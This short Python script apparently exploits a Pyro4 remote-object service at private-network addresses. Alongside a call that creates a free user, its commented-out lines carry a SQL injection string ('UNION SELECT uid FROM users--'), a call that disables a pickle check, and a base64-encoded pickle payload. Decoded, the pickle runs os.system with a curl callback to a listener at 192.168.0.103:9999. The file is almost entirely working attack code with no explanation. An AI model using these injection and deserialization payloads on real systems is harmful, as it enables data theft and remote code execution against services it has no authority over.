import Pyro4

public = "PYRONAME:Public@192.168.0.103:5643" #"PYRO:PublicFunctions@195.66.114.196:5644"
private = "PYRONAME:Private@192.168.0.103"




public_proxed = Pyro4.Proxy(public)
public_proxed._pyroTimeout = 10
public_proxed._pyroHandshake = True
#private_proxed = Pyro4.Proxy(private)
print(public_proxed.CreateFreeUser())

#print(public_proxed.GetObjectList("17cdd37e-f36e-451c-988b-21567a76b312' UNION SELECT uid FROM users--"))
#print(private_proxed.DisablePickleCheck("2825ac02-fe7b-42b1-896c-7530e37a2268"))
#print(public_proxed.PutObject('2825ac02-fe7b-42b1-896c-7530e37a2268', "gASVPgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCNjdXJsIGh0dHA6Ly8xOTIuMTY4LjAuMTAzOjk5OTkvdGVzdJSFlFKULg=="))

#358e953c-2048-4c62-a90b-7a585d3df3d2
